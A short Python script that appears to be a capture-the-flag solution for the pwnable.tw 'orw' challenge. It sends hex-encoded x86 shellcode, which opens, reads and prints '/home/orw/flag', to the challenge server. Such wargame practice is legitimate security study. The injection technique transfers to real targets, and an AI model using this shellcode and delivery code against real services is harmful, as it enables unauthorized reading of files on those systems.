#!/usr/bin/env python3
import socket
import time

shellcode = bytes.fromhex("eb365e31c088460e89f331c931d2b005cd8089c389f131d2b26431c0b003cd8089c231c0b004b301cd8031c040cd80e8c5ffffff2f686f6d652f6f72772f666c6167")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw", 10001))

# Get prompt
data = s.recv(1024)
print(data.decode())

# Send shellcode
s.send(shellcode)

# Get response
time.sleep(1)
response = s.recv(1024)
print(response.decode())

s.close()
